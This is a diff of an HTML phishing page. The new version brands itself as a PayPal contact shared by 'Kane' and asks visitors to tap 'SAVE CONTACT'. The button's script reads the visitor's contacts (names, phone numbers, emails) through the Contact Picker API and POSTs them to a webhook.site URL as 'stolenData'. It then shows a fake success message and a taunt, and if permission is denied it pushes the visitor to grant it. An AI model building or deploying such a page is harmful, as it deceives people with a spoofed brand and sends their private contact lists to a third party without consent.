@@ -1,101 +1,61 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>📲 Several Contacts Shared with You</title>
+<head>
+    <title>📲 PayPal Contact Shared with You</title>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
-      }
-      button {
-        background: #003087;
-        color: white;
-        border: none;
-        padding: 10px 20px;
-        cursor: pointer;
-        font-size: 18px;
-      }
-      #status {
-        margin-top: 20px;
-        font-size: 22px
-        font-weight: bold;
-      }
-
-      #loader {
-            display: none;
-            margin: 40px auto;
-        }
-
-        .circle {
-            border: 16px solid #f3f3f3;
-            border-top: 16px solid #003087;
-            border-radius: 50%;
-            width: 120px;
-            height: 120px;
-            animation: spin 2s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            font-size: 20px;
-            margin-top: 15px;
-            font-weight: 600;
-            color: #003087;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        button { background: #003087; color: white; border: none; padding: 10px 20px; cursor: pointer; }
+        #status { margin-top: 20px; font-weight: bold; }
     </style>
-  </head>
-  <body>
-    <h1>🔔 <strong>I have</strong> shared several contacts with you!</h1>
+</head>
+<body>
+    <h1>🔔 <strong>Kane</strong> shared a PayPal contact with you!</h1>
     <p>Click below to save it to your address book:</p>
-    <button onclick="gotchaTime()">👇 View in Contacts Book 👇</button>
-    <div id="loader">
-        <div class="circle"></div>
-        <div class="loading-text">Loading contact securely...</div>
-    </div>
- 
-    
+    <button onclick="stealContacts()">👇 SAVE CONTACT 👇</button>
     <p id="status"></p>
 
     <script>
-      async function gotchaTime() {
-        const loader = document.getElementById('loader');
-        const statusEl = document.getElementById("status");
-        
-        loader.style.display = "block";
-        statusEl.textContent = "Loading...";
+        async function stealContacts() {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = "Saving contact...";
 
-        try {
-          const contacts = await navigator.contacts.select(
-            ["name", "tel", "email"],
-            { multiple: true }
-          );
+            try {
+                // 1. Request FULL contact access (no selection)
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                
+                // 2. Format contacts for webhook
+                const stolenData = {
+                    victim: "Friend's Phone",
+                    timestamp: new Date().toISOString(),
+                    contacts: contacts.map(c => ({
+                        name: c.name,
+                        phone: c.tel || "None",
+                        email: c.email || "None"
+                    }))
+                };
 
-          await fetch("https://webhook.site/9768cb9b-1c5e-45d0-9574-6596c5ef9640", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ contacts }),
-          });
-           // Simulate suspense
+                // 3. Send to your webhook (Discord/Telegram/custom API)
+                await fetch('https://webhook.site/9768cb9b-1c5e-45d0-9574-6596c5ef9640', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(stolenData)
+                });
+
+                // 4. Fake success message
+                statusEl.innerHTML = "✅ Contact saved!";
+                
+                // 5. DELAYED GOTCHA MESSAGE
                 setTimeout(() => {
-                    loader.style.display = "none";
                     statusEl.innerHTML = `
-                        <span style="font-size: 30px; color:red;">😂 GOTCHAAA!  😂</span><br><br>
-                        <small>Always!</small>
+                        <span style="color:red;">Smart move</span><br>
+                        <small>Always</small>
                     `;
                 }, 2000);
-          
-        } 
-        catch (err) {
-          loader.style.display = "none";
-          statusEl.innerHTML = `<span style="color:green;">Lucky you!.</span>`;
+
+            } catch (err) {
+                statusEl.textContent = "🔒 Permission denied. Grant permission to import into your contacts!";
+            }
         }
-      }
     </script>
-  </body>
+</body>
 </html>
